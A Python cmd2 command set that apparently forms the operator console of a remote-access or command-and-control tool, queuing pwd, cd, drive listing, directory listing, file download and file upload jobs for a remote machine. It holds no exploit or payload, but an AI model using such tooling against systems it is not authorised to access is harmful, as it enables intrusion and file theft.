import argparse

from connect.convert import string_to_base64, bytes_to_base64
from cmd2 import Cmd2ArgumentParser, CommandSet, with_argparser, with_default_category, Cmd, Statement


@with_default_category('Files')
class FilesCommands(CommandSet):
    """
    The files command set.
    """

    def __init__(self, post_job):
        super().__init__()
        self.post_job = post_job

    """
    PWD Command
    """

    def do_pwd(self, _: Statement):
        """ Retrieve the current working directory. """
        self.post_job(f'"name":"pwd","description":"retrieve the current working directory","arguments":"","type":1')

    """ 
    CD Command 
    """

    cd_parser = Cmd2ArgumentParser()
    cd_parser.add_argument('dir', help='the directory to change to')

    @with_argparser(cd_parser)
    def do_cd(self, args: argparse.Namespace):
        """ Change the current working directory. """
        directory = string_to_base64(args.dir)
        self.post_job(f'"name":"cd","description":"change the current working directory","arguments":"{directory}","type":1')

    """ 
    Drives Command 
    """

    def do_drives(self, _: Statement):
        """ Retrieve all the local drives. """
        self.post_job(f'"name":"drives","description":"retrieve all local drives","arguments":"","type":1')

    """ 
    Dir Command 
    """

    dir_parser = Cmd2ArgumentParser()
    dir_parser.add_argument('dir', help='the directory to inspect')

    @with_argparser(dir_parser)
    def do_dir(self, args: argparse.Namespace):
        """ List the contents and properties of a directory. """
        directory = string_to_base64(args.dir)
        self.post_job(f'"name":"dir","description":"list a directory","arguments":"{directory}","type":1')

    """ 
    Download Command 
    """

    download_parser = Cmd2ArgumentParser()
    download_parser.add_argument('file', help='the file to download')

    @with_argparser(download_parser)
    def do_download(self, args: argparse.Namespace):
        """ Download a remote file. """
        file = string_to_base64(args.file)
        self.post_job(f'"name":"download","description":"download a file","arguments":"{file}","type":2')

    """
    Upload Command
    """

    upload_parser = Cmd2ArgumentParser()
    upload_parser.add_argument('file', completer=Cmd.path_complete, help='file to upload')
    upload_parser.add_argument('path', help='path to upload to')

    @with_argparser(upload_parser)
    def do_upload(self, args: argparse.Namespace):
        """ Uploads a file to the remote machine. """
        with open(args.file, 'rb') as fd:
            file = bytes_to_base64(fd.read())
        path = string_to_base64(args.path)
        self.post_job(f'"name":"upload","description":"upload a file","arguments":"{file},{path}","type":1')